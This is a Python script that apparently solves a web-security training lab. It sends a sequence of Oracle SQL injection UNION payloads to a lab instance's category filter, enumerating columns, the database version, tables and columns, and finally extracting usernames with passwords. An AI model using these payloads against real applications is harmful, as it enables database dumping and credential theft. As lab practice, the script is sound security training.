#!/usr/bin/env python3

import urllib.parse
import requests

# SQL injection attack, listing the database contents on Oracle

link = "https://0aaf00080389bd57c01f8f6b00200004.web-security-academy.net/filter?category=Pets"
payload={}
headers = {
  'Cookie': 'session=14YGLBDFHLleuiv7PvzUizmJvhf2shjj'
}

#chunk = "' ORDER BY 2--" # number of columns, both are text
#chunk = "' UNION SELECT 'abc','def' FROM dual--" # number of columns, both are text
#chunk = "' UNION SELECT NULL,banner FROM v$version--" # database version = oracle
#chunk = "' UNION SELECT NULL,table_name FROM all_tables--" # show tables in one field
#chunk = "' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_XDGEEB'--" # show columns of table
chunk = "' UNION SELECT NULL,USERNAME_MWLATF||'-'||PASSWORD_YVYSOV FROM USERS_XDGEEB--" # show columns of table
url = link + urllib.parse.quote(chunk)

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
